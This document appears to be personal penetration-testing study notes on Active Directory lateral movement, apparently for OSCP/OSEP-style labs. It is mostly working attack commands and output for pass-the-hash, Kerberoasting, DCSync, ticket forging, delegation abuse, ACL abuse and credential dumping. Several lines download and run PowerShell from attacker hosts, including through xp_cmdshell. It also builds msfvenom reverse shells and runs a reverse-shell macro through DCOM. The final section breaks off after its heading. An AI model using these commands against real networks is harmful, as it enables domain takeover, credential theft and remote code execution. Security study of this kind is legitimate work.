# Lateral Movement

<details>

<summary>Admin Password Reuse</summary>

Using crackmapexec:

```bash
└─# crackmapexec smb 10.11.1.20-24 -u administrator -H 'ee0c207898a5bccc01f38115019ca2fb' --local-auth --lsa 
SMB         10.11.1.22      445    SVCLIENT08       [*] Windows 10 Pro N 14393 x64 (name:SVCLIENT08) (domain:SVCLIENT08) (signing:False) (SMBv1:True)
SMB         10.11.1.21      445    SV-FILE01        [*] Windows Server 2016 Standard 14393 x64 (name:SV-FILE01) (domain:SV-FILE01) (signing:False) (SMBv1:True)
SMB         10.11.1.24      445    SVCLIENT73       [*] Windows 10 Pro N 14393 x64 (name:SVCLIENT73) (domain:SVCLIENT73) (signing:False) (SMBv1:True)
SMB         10.11.1.20      445    SV-DC01          [*] Windows 10.0 Build 17763 x64 (name:SV-DC01) (domain:SV-DC01) (signing:True) (SMBv1:False)
SMB         10.11.1.22      445    SVCLIENT08       [+] SVCLIENT08\administrator:ee0c207898a5bccc01f38115019ca2fb (Pwn3d!)
SMB         10.11.1.21      445    SV-FILE01        [-] SV-FILE01\administrator:ee0c207898a5bccc01f38115019ca2fb STATUS_LOGON_FAILURE 
SMB         10.11.1.24      445    SVCLIENT73       [+] SVCLIENT73\administrator:ee0c207898a5bccc01f38115019ca2fb (Pwn3d!
```

* Login with impacket psexec using hashes

```bash
impacket-psexec jimmy@192.168.35.142 -hashes ee0c207898a5bccc01f38115019ca2fb
```

</details>

<details>

<summary>Obtain Kerberos Ticket</summary>

* Sync the Kali's timing with the DC timing.

```bash
ntpdate <dc_ip>
```

* To collect the Kerberos Ticket

```bash
impacket-GetUserSPNs hacker.local/Administrator:Password1 -dc-up 192.168.35.142 -request
```

</details>

<details>

<summary>Getting TGT from Service</summary>

For pass the ticket attack

```bash
impacket-GetNPUsers -dc-ip 10.10.10.10 active.htb/SVC-TGS -no-pass
```

</details>

<details>

<summary>Pass the Hash</summary>

* Works only for server or service using NTLM authentication, not Kerberos authentication.
* Requires local administrative permissions.

Retrieve the content of the Windows Security Account Manager (SAM) file to dump client01's hashes.

```sh
reg save hklm\sam c:\windows\temp\sam
```

```sh
reg save hklm\system c:\windows\temp\system
```

```sh
impacket-secretsdump -system system -sam sam local
```

```bash
impacket-secretsdump Hacker.local/hguy:password@192.168.35.144'
```

Connect to victim by passing the hash

```sh
impacket-psexec Administrator:@192.168.199.59 -hashes aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5
```

* hashes in the format: \<LM>:\<NT>
* LM hashes discontinued since Win10

</details>

<details>

<summary>Pass the Hash with Computer Account</summary>

```bash
sekurlsa::pth /user:web01$ /domain:EVIL.COM /ntlm:f4528218862ef1bed4c351d7b10d77fd
```

</details>

<details>

<summary>Kerberoasting</summary>

To obtain TGS-REP hash to crack service accounts passwords.

### Invoke-Kerberoast.ps1

Collects a list of service accounts along with their correlating password hashes

```sh
powershell -ep bypass -c "Import-Module .\Invoke-Kerberoast.ps1; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt"
```

### Rubeus.exe

[https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe)

```bash
C:\temp>Rubeus.exe kerberoast
Rubeus.exe kerberoast

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 


[*] Action: Kerberoasting
...
```

### GetUserSPNs.py

* Good when don't have access to the victim
* On the attacker:

```bash
GetUserSPNs.py active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
```

NXC Kerberoasting (Using kerberos auth)

```
nxc ldap dc1.scrm.local -u ksimpson -p ksimpson -d scrm.local -k --kerberoasting hash
```

### Cracking Hashes

```sh
hashcat -m 13100 -a 0 kerb.txt /usr/share/wordlists/rockyou.txt
```

</details>

<details>

<summary>Overpass the Hash</summary>

* “Over” abuse a NTLM user hash to gain a full Kerberos Ticket Granting Ticket or service ticket
* Requires local admin rights

1. Obtain the NTLM hash first&#x20;

```
mimikatz.exe
```

```
privilege::debug
```

```
sekurlsa::logonpasswords
```

2. Creates a new PowerShell process in the context of the Jeff\_Admin user

```
sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
```

3. Inside the new Powershell session, generate a TGT by authenticating to a network share on the domain controller.&#x20;

```powershell
net use \\dc01
```

* We used "net use" arbitrarily in this example but we could have used any command that requires domain permissions and would subsequently create a TGS.

```
klist
```

4. Since we have generated Kerberos tickets and operate in the context of Jeff\_Admin in the PowerShell session, we may reuse the TGT to obtain code execution on the domain controller

```
.\PsExec.exe \\dc01 cmd.exe
```

</details>

<details>

<summary>Pass the Ticket</summary>

Takes advantage of the TGS, which may be exported and re-injected elsewhere on the network and then used to authenticate to a specific service.

1. Obtain Domain SID

```sh
whoami /user
# Output: S-1-5-21-1602875587-2787523311-2599479668-1103
# Domain-SID: S-1-5-21-1602875587-2787523311-2599479668
```

2. Either obtain NTLM hash or generate hash from password using [https://www.browserling.com/tools/ntlm-hash](https://www.browserling.com/tools/ntlm-hash)

2) Use Mimikatz

```bash
.\mimikatz.exe
kerberos::purge
kerberos::list
```

* Ensure that no kerberos ticket is present

```bash
kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
```

* To create a silver ticket, we use the password hash and not the cleartext password. If a kerberoast session presented us with the cleartext password, we must hash it before using it to generate a silver ticket.

```
kerberos::list
```

3. Now that we have this ticket loaded into memory, we can interact with the service and gain access to any information based on the group memberships we put in the silver ticket.

</details>

<details>

<summary>NTDSam</summary>



</details>

<details>

<summary>DCSync</summary>

### From Bloodhound:

![](<../.gitbook/assets/image (140).png>)

### Using Secretsdump

```bash
secretsdump.py -just-dc svc_loanmgr@10.10.10.175 -outputfile dcsync_hashes
#Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

#Password:
#[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
#[*] Using the DRSUAPI method to get NTDS.DIT secrets
#Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
```

### Using Mimikatz (Powershell)

* Download Invoke-Mimikatz.ps1 from [here](https://github.com/phra/PowerSploit/raw/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1)

```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:administrator"'
# OR
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:administrator"'
```

</details>

<details>

<summary>Cracking Mscash (Cached Domain Credentials)</summary>

[https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials)

```bash
secretsdump.py administrator@172.16.197.11 -hashes :f1014ac49bae005ee3ece5f47547d185 
# MEDTECH.COM/Administrator:$DCC2$10240#Administrator#a7c5480e8c1ef0ffec54e99275e6e0f7
# MEDTECH.COM/yoshi:$DCC2$10240#yoshi#cd21be418f01f5591ac8df1fdeaa54b6
# MEDTECH.COM/wario:$DCC2$10240#wario#b82706aff8acf56b6c325a6c2d8c338a
```

### Format into $DCC2$10240#username#hash format for hashcat&#x20;

```bash
echo ; cat hashes.txt ; echo ; cut -d ":" -f 2 medtech_hashes
# $DCC2$10240#Administrator#a7c5480e8c1ef0ffec54e99275e6e0f7
# $DCC2$10240#yoshi#cd21be418f01f5591ac8df1fdeaa54b6
# $DCC2$10240#wario#b82706aff8acf56b6c325a6c2d8c338a
# $DCC2$10240#joe#464f388c3fe52a0fa0a6c8926d62059c
```

### Crack with Hashcat

```bash
hashcat -m 2100 -a 0 hash.txt rockyou.txt
```

</details>

<details>

<summary>WriteDacl (Bloodhound)</summary>

* Download PowerView from [here](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1)

#### On Victim:

```bash
*Evil-WinRM* PS C:\temp> Bypass-4MSI
Info: Patching 4MSI, please be patient...
[+] Success!

*Evil-WinRM* PS C:\temp> iex(new-object net.webclient).downloadstring('http://10.10.14.4/PowerView.ps1')

*Evil-WinRM* PS C:\temp> net user john abc123! /add /domain
The command completed successfully.
*Evil-WinRM* PS C:\temp> net group "Exchange Windows Permissions" john /add
# Needed cuz based on bloodhound, exhange windows permissions group has writedacl privileges for domain
The command completed successfully.
*Evil-WinRM* PS C:\temp> net localgroup "Remote Management Users" john /add
The command completed successfully.

*Evil-WinRM* PS C:\temp> $pass = convertto-securestring 'abc123!' -asplain -force
*Evil-WinRM* PS C:\temp> $cred = new-object system.management.automation.pscredential('htb\john', $pass)
*Evil-WinRM* PS C:\temp> Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync
```

#### On Attacker:

```bash
secretsdump.py htb/john@10.10.10.161
# [*] Using the DRSUAPI method to get NTDS.DIT secrets
# htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
```

</details>

<details>

<summary>Distributed Component Object Model</summary>

* is a system for creating software components that interact with each other within or across processes.

- Requires Local admin (to call the DCOM Service Control Manager)
- Requires port 135, 445
- Requires Microsoft office to be installed on target

1. Create an instance of the Object on the target

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))
```

2. Check the available methods for the object

```powershell
$com | Get-Member
```

* If it has the `Run` method, attacker is able to execute Visual Basic for Applications (VBA) macro remotely.

3. Generate Reverse shell payload

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f hta-psh -o evil.hta
```

4. Extract from the generated payload, the line starting with `powershell.exe -nop -w hidden -e` followed by the Base64 encoded payload and use the simple Python script to split the command into smaller chunks (ensuring that the literal strings limit in Excel macros is met.)

```python
str = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQ....."

n = 50

for i in range(0, len(str), n):
	print "Str = Str + " + '"' + str[i:i+n] + '"'
```

5. Put the reverse shell payload into macro

```vba
Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
    Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
    ...
    Str = Str + "EQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHM"
    Str = Str + "AXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA="
    Shell (Str)
End Sub
```

* Save the file in `Excel 97-2003 Workbook` format.

6. Transfer the file over to target using SMB, open the excel file and run the macro.

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))

$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"

$RemotePath = "\\192.168.1.110\c$\myexcel.xls"

[System.IO.File]::Copy($LocalPath, $RemotePath, $True)

$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"

$temp = [system.io.directory]::createDirectory($Path)

$Workbook = $com.Workbooks.Open("C:\myexcel.xls")

$com.Run("mymacro")

```

</details>

<details>

<summary>Dump Domain Admin Hash from DC</summary>

```bash
mimikatz.exe
privilege::debug
lsadump::dcsync /domain:prod.corp1.com /user:prod\administrator
evil-winrm  -i 192.168.70.70 -u administrator -H 2892d26cdf84d7a70e2eb3b9f05c425e
```

</details>

<details>

<summary>Change Domain Admin password</summary>

* From high privilege shell
* Changes the password to `password`

```sh
net user /domain administrator password
```

</details>

<details>

<summary>Open CMD Prompt as Another User</summary>

```bash
runas /user:corp\jen powershell.exe
```

</details>

## OSEP Notes below

<details>

<summary>Stealing Keytab files (Linux AD)</summary>

* Contains a kerberos principal name & encrypted keys
*   ```bash
    kinit administrator@CORP1.COM -k -t /tmp/administrator.keytab
    ```


* Verify that tickets from keytab have been loaded && renew tickets
  *   ```bash
      klist
      kinit -R
      ```


* Remove all kerberos tickets
  * ```bash
    kdestroy
    ```

</details>

<details>

<summary>Stealing Credential Cache Files (Linux AD)</summary>

* Check for presence with&#x20;
  *   ```bash
      ls -al /tmp/krb5cc_*
      ```

      If not present but has domain user on linux box --> try to [ssh into that domain user](../services/22-ssh.md#ssh-persistency) (add attacker's SSH public key to domain user authorized host & ssh as domain user) and `ls -la /tmp/krb5cc_*`
* Copy credential cache files to Kali
  *   ```bash
      scp root@linuxvictim:/tmp/krb5cc_607000500_qZWKpe .
      #scp -i  ssh_key pete@complyedge.com@web05:/tmp/krb5cc_75401103_PlYU68 .
      ```


* Set environment variable on Kali
  *   ```bash
      export KRB5CCNAME=/home/kali/Documents/offsec/linux_lateral_movement/krb5cc_607000500_qZWKpe
      ```


*   Install the following, if required

    * ```bash
      sudo apt install krb5-user
      ```


* Add target DC and generic domain to /etc/hosts
  *

      <figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>


* IMPT: THE SOURCE OF THE KERBEROS REQUEST MATTERS!!! --> SET UP [LIGOLO-NG!](../post-exploitation/port-forwarding-pivoting.md#ligolo-ng)
* Then, can
  * <pre class="language-bash"><code class="lang-bash"><strong>impacket-psexec Administrator@DC01.CORP1.COM -k -no-pass
    </strong></code></pre>

</details>

<details>

<summary>Creating Keytab files (Linux AD)</summary>

* Create in /tmp/administrator.keytab
* ```bash
  ktutil
  addent -password -p administrator@CORP1.COM -k 1 -e rc4-hmac
  wkt /tmp/administrator.keytab
  quit
  ```

</details>

<details>

<summary>Creating Credential Cache Files (Linux AD)</summary>

* Acquire TGT for current user
  *   ```bash
      kinit
      ```


* List tickets currently stored in user's credential cache file
  *   ```bash
      klist
      ```


* Get a list of available SPN from DC
  *   ```bash
      ldapsearch -Y GSSAPI -H ldap://dc01.corp1.com -D "Administrator@CORP1.COM" -W -b "dc=corp1,dc=com" "servicePrincipalName=*" servicePrincipalName
      ```


* Request a service ticket from Kerberos for MSSQL SPN
  * ```bash
    kvno MSSQLSvc/DC01.corp1.com:1433
    ```

</details>

<details>

<summary>Abusing GenericAll</summary>

## For Domain User

* Change password of an account
  *   ```powershell
      net user testservice1 P@ssw0rd /domain
      ```


* Spawn new powershell.exe in context of testservice1
  *   ```powershell
      runas /user:prod\testservice1 powershell.exe
      ```



## For Domain Group

* ```powershell
  net group testgroup offsec /add /domain
  ```

</details>

<details>

<summary>Exploiting WriteDACL</summary>

* Can add new access rights like GenericAll, GenericWrite, or even DCSync
*

    <figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
* Adding GenericAll rights:
  *   ```powershell
      # Might need to migrate to sqlsvc process using metasploit

      # Load PowerView
      iex (new-object net.webclient).downloadstring('http://192.168.45.215/PowerView.ps1')

      # Modify sqlsvc to have full control over the mailadmins group
      Add-DomainObjectAcl -Rights 'All' -TargetIdentity "mailadmins" -PrincipalIdentity "sqlsvc"

      # Add sqlsvc to mailadmins domain group
      net group "mailadmins" sqlsvc /add /domain

      # Verify that sqlsvc is inside mailadmins group
      net user sqlsvc /domain
      ```



OR.. ![](<../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png>)

```powershell
#Current user is svc-alfresco
net user bill P@ssw0rd123! /add /domain
net group "Exchange Windows Permissions" bill /add
net localgroup "Remote Management Users" bill /add

iex (new-object net.webclient).downloadstring('http://10.10.14.20/PowerView.ps1')
$pass = convertto-securestring 'P@ssw0rd123!' -asplain -force
$cred = new-object system.management.automation.pscredential('htb\bill', $pass)
Add-ObjectACL -PrincipalIdentity bill -Credential $cred -Rights DCSync
```

</details>

<details>

<summary>Exploiting GenericWrite on Another User</summary>

### Set Login Script for victim user

* Generate using [csharp\_shellcode python script](../good-exploit-code/c-shellcode-runner.md#process-injector-example)

```powershell
# Load PowerView
iex (new-object net.webclient).downloadstring('http://192.168.45.218/PowerView.ps1')

# Setup SMB server
sudo python3 /usr/local/bin/smbserver.py share . -smb2support

# Logon Script to point to rev shell exe
Set-DomainObject -Identity SHAUN.BLAKE -Set @{'scriptpath'='\\192.168.45.218\share\ProcessInjection.exe'}
```

### Cracking User's Password

* Able to set a service principal name and kerberoast that account
  *   ```powershell
      wget https://raw.githubusercontent.com/ShutdownRepo/targetedKerberoast/refs/heads/main/targetedKerberoast.py
      ./targetedKerberoast.py --dc-ip '192.168.170.70' -v -d 'prod.corp1.com' -u 'offsec' -p 'lab'
      ```


* Obtain TGS-REP hash
  *   ```bash
      hashcat -m 13100 hash.txt rockyou.txt
      ```



</details>

<details>

<summary>Exploiting GenericWrite on Computer Object (Including DC)<br></summary>

OR USE [RBCD FROM KALI ATTACKER MACHINE!!](lateral-movement.md#resource-based-constrained-delegation)

![](<../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

* Enumerating permissions assigned to current user
  *   ```powershell
      Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
      ```


  * Since we have GenericWrite on appsrv01, we can update any non-protected property on that object, including msDS-AllowedToActOnBehalfOfOtherIdentity and add the SID of a different computer.

- <pre class="language-powershell"><code class="lang-powershell">iex (new-object net.webclient).downloadstring('http://192.168.45.206/Powermad.ps1')
  iex (new-object net.webclient).downloadstring('http://192.168.45.206/PowerView.ps1')

  # Create a fake computer account
  New-MachineAccount -MachineAccount myComputer -Password $(ConvertTo-SecureString 'h4x' -AsPlainText -Force)
  Get-DomainComputer -Identity myComputer

  # Get the SID of myComputer$
  $sid =Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid

  # Create a Security Descriptor for RBCD
  $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"

  # Convert and Apply the Security Descriptor to appsrv01
  $SDbytes = New-Object byte[] ($SD.BinaryLength)
  $SD.GetBinaryForm($SDbytes,0)
  Get-DomainComputer -Identity appsrv01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

  # Verify That RBCD Was Configured
  $RBCDbytes = Get-DomainComputer appsrv01 -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
  $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RBCDbytes, 0
  $Descriptor.DiscretionaryAcl

  # Verify the SID Mapping
  ConvertFrom-SID S-1-5-21-634106289-3621871093-708134407-3601

  # Generate an NTLM Hash for myComputer$
  .\Rubeus.exe hash /password:h4x

  # Request a Ticket Granting Service (TGS) Ticket Using Rubeus
  .\Rubeus.exe s4u /user:myComputer$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:CIFS/appsrv01.prod.corp1.com /ptt

  # Verify Remote Access to appsrv01
  dir \\appsrv01.prod.corp1.com\c$

  # Obtaining code execution
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=80 EXITFUNC=thread -f exe -o shell.exe
  copy shell.exe \\appsrv01.prod.corp1.com\C$\Windows\Temp\shell.exe
  wmic /node:appsrv01.prod.corp1.com process call create "C:\Windows\Temp\shell.exe"

  <strong>#OR 
  </strong>
  python3 mkpsrevshell.py 192.168.45.222 443
  wmic /node:appsrv01.prod.corp1.com process call create "powershell -e JABjAG.."

  </code></pre>

</details>

<details>

<summary>Exploiting ForceChangePassword</summary>

<figure><img src="../.gitbook/assets/image (317).png" alt=""><figcaption></figcaption></figure>

Currently, pwned adminwebsvc@final.com --> part of webadmins grp --> able to ForceChangePassword for Nina

```powershell
iex(new-object net.webclient).downloadstring('http://192.168.45.160/PowerView.ps1')	
$NewPassword = ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force
Set-DomainUserPassword -Identity Nina -AccountPassword $NewPassword
```

</details>

<details>

<summary>Unconstrained Delegation</summary>

![](<../.gitbook/assets/image (313).png>)

* Allows forwardable TGT --> frontend service is able to perform authentication on behalf of user to any service

## Enumeration

```powershell
Import-Module powerview.ps1
Get-DomainComputer -Unconstrained
# Domain Controllers are configured with unconstrained delegation by default

#To know the IP of the target
nslookup appsrv01
```

## Exploitation

* Must be local admin on the target (eg: appsrv01)
*   3 methods

    * Have domain admin visit the application using uncontrained kerberoast --> dump TGT of admin
      *   ```
          sekurlsa::tickets
          ```

          <figure><img src="../.gitbook/assets/image (314).png" alt=""><figcaption></figcaption></figure>


      *   ```
          sekurlsa::tickets /export
          ```

          <figure><img src="../.gitbook/assets/image (315).png" alt=""><figcaption></figcaption></figure>


      *   ```
          kerberos::ptt [0;1801fa]-2-0-60a10000-admin@krbtgt-PROD.CORP1.COM.kirbi
          ```

          <figure><img src="../.gitbook/assets/image (316).png" alt=""><figcaption></figcaption></figure>


      *   ```powershell
          exit
          # Verify that we have the TGT
          klist
          # Laterally move to DC
          C:\Tools\SysinternalsSuite\PsExec.exe \\cdc01 cmd.exe
          ```


    * OR Krbrelayx attack on unconstrained delegation
      *

          <figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>


      * Dump the NTLM hashes for Files01 computer account (FILES01$)![](<../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
        *   ```powershell
            impacket-secretsdump CORP/adam:4Toolsfigure3@192.168.101.104
            ```


      * Add an SPN for `attacker.corp.com` on `FILES01$`
        *   ```powershell
            python3 addspn.py -u "corp.com\FILES01$" -p aad3b435b51404eeaad3b435b51404ee:9aa7af9cb73fbb418adf1586e9686931 -s HOST/attacker.corp.com --additional 'dc01.corp.com'
            ```


      * Add a DNS Entry for `attacker.corp.com` in Active Directory
        *   ```powershell
            python3 dnstool.py -u "corp.com\FILES01$" -p aad3b435b51404eeaad3b435b51404ee:9aa7af9cb73fbb418adf1586e9686931 -r 'attacker.corp.com' -d '192.168.45.211' --action add 'dc01.corp.com'
            ```


      * Verify DNS Resolution for Attacker Host
        *   ```powershell
            nslookup attacker.corp.com dc01.corp.com
            ```


      * Start `krbrelayx` to Relay Authenticated TGT
        *   ```powershell
            # aes256-cts-hmac-sha1-96
            python3 krbrelayx.py -aesKey 00ba3cfd9198fa8a6dc795324242810e98c7d36d083bd811fdfe204ef30cc7a7
            ```


      * Trigger Authentication from the DC Using the Print Spooler Bug
        *   ```powershell
            python3 krbrelayx.py -aesKey python3 printerbug.py "corp.com/FILES01$"@dc01.corp.com -hashes aad3b435b51404eeaad3b435b51404ee:22a506a9cabc86c93dda21decc4b2e75 "attacker.corp.com"
            ```


        * If errors out --> rerun the impacket secretdump again to obtain the computer hashes
        * Check if got ccache file in the directory
      * Use the Captured TGT to Dump Credentials from the DC
        *   ```powershell
            impacket-secretsdump -k -no-pass "corp.com/DC01$"@dc01.corp.com
            ```


      * Running Impacket-PsExec for Remote Code Execution
        * ```powershell
          impacket-psexec admin@dc01.corp.com -hashes :<nt hash>
          ```



    * OR Force high-privileged authentication without any user interaction (PrintSpooler)
      *   ```powershell
          Rubeus.exe monitor /interval:5 /filteruser:CDC01$
          SpoolSample.exe <target-machine> <capture-server>
              #SpoolSample.exe CDC01 APPSRV01
          Rubeus.exe ptt /ticket:doIFIjCCBR6gAwIBBaEDAgEWo…
          ```


      * Since machine account (CDC01$) is not local admin on DC, can't laterally move to it
      * Can laterally move via:
        * [Golden Ticket](persistence.md#golden-ticket)
        * [Dump administrator hash](lateral-movement.md#dump-domain-admin-hash-from-dc)

</details>

<details>

<summary>Constrained Delegation</summary>

* Solve the double-hop issue while limiting access to only the desired backend service defined in msds-allowedtodelegateto
* S4U2Self --> Allows a service to request Kerberos TGS for any user, including domain admin, without needing their passwords or hash
* S4U2Proxy --> Allows a service to take a TGS from S4U2Self and exchange it for a TGS to a backend service

![](<../.gitbook/assets/image (11) (1) (1) (1).png>)

## Enumeration

*   <pre class="language-powershell"><code class="lang-powershell"><strong>#Powerview
    </strong><strong>Get-DomainUser -TrustedToAuth
    </strong></code></pre>

    <figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>


* Contained delegation is configured on IISSvc and it is only allowed to MSSQLSvc

## Exploitation 1

* Compromise the IISSvc account
  * ```powershell
    # Generate the NTLM hash
    .\Rubeus.exe hash /password:lab
    # Generate TGT for IISSvc
    .\Rubeus.exe asktgt /user:iissvc /domain:prod.corp1.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E
    ```
* Use S4U2Proxy to get a ticket to MSSQL (SPN listed in msds-allowedtodelegateto field)
  * ```powershell
    .\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /ptt
    ```
*   Execute code on MSSQL

    * Enumerate the user logged in to MSSQL --> logged in as the domain admin

    <figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



## Exploitation 2

* Modify service names in memory to gain unauthorized access to different services on same host
* When TGS is returned by KDC, only server name is encrypted but not service name
* Attacker can modify service name to authenticate to different service
* For instance if msDS-AllowedToDelegateTo is set to MSSQLSvc/cdc01.prod.corp1.com
* Able to change it to access file system (cifs)
*   ```powershell
    .\Rubeus.exe s4u /ticket:doIE+jCCBPag... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com /altservice:CIFS /ptt
    ```



## Exploitation 3

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

* Obtain a Ticket Granting Ticket (TGT) for the Service Account
  *   ```powershell
      impacket-getTGT corp.com/iissvc -hashes :12bb0b468b42c76d48a3a5ceb8ade2e9
      export KRB5CCNAME=iissvc.ccache
      ```


* Obtain a Service Ticket (ST) for MSSQL Service as Administrator
  *   ```powershell
      impacket-getST -spn mssqlsvc/sql01.corp.com:1433 -impersonate administrator corp.com/iissvc -k -no-pass
      export KRB5CCNAME=administrator.ccache
      ```


* Access the SQL Server as Administrator
  *   ```powershell
      impacket-mssqlclient sql01.corp.com -k
      ```


* Check the current user and privileges inside SQL Server:
  *   ```sql
      SELECT SYSTEM_USER;
      SELECT IS_SRVROLEMEMBER('sysadmin');
      SELECT CURRENT_USER;
      ```


* Execute Reverse Shell via xp\_cmdshell in sql server
  * ```sql
    EXECUTE AS LOGIN = 'sa';
    EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
    EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
    EXEC xp_cmdshell 'powershell -c "IEX (New-Object Net.WebClient).DownloadString(\"http://192.168.45.211/runall.ps1\")"';
    ```

</details>

<details>

<summary>Resource-Based Constrained Delegation</summary>

* msDS-AllowedToActOnBehalfOfOtherIdentity
* Backend service controls which frontend services can delegate on behalf of users
* Attack against RBCD needs to happen from a computer account or a service account with a SPN

[Exploiting GenericWrite on Computer Object](lateral-movement.md#exploiting-genericwrite-on-computer-object)

* Find which computers we can modify using GenericWrite permissions
  *   ```powershell
      Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {
          $_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_
      } | Where-Object { $_.ActiveDirectoryRights -like '*GenericWrite*' }
      ```


* Add a New Computer Account (myComputer$) to the Domain
  *   ```powershell
      impacket-addcomputer -computer-name 'myComputer$' -computer-pass 'h4x' corp.com/mary -hashes :942f15864b02fdee9f742616ea1eb778
      ```


* Configure RBCD on the Target Machine (BACKUP01$)
  *   ```powershell
      impacket-rbcd -action write -delegate-to "BACKUP01$" -delegate-from "myComputer$" corp.com/mary -hashes :942f15864b02fdee9f742616ea1eb778
      ```


* Obtain a Service Ticket (ST) as Administrator
  *   ```powershell
      impacket-getST -spn cifs/backup01.corp.com -impersonate administrator 'corp.com/myComputer$:h4x'
      ```


  * If faced `Kerberos SessionError: KRB_AP_ERR_BADMATCH(Ticket and authenticator don't match)` error, use the following commands:

```bash
# Solving KRB_AP_ERR_BADMATCH error
impacket-getTGT 'cowmotors-int.com/myComputer$'
export KRB5CCNAME=myComputer\$.ccache
impacket-getST -spn cifs/web01.cowmotors-int.com -impersonate administrator -k -no-pass 'cowmotors-int.com/myComputer$'
```

* Use ccache file
  * ```
    mv administrator@cifs_jump09.ops.comply.com@OPS.COMPLY.COM.ccache new_admin.ccache
    export KRB5CCNAME=new_admin.ccache
    ```
* Execute Commands as Administrator
  * ```powershell
    impacket-psexec administrator@backup01.corp.com -k -no-pass
    ```

</details>

<details>

<summary>Extra SID Attack (MOVING FROM CHILD TO PARENT DOMAIN)</summary>

## FOR CHILD DOMAIN TO PARENT DOMAIN EG (prod.corp1.com to corp1.com)

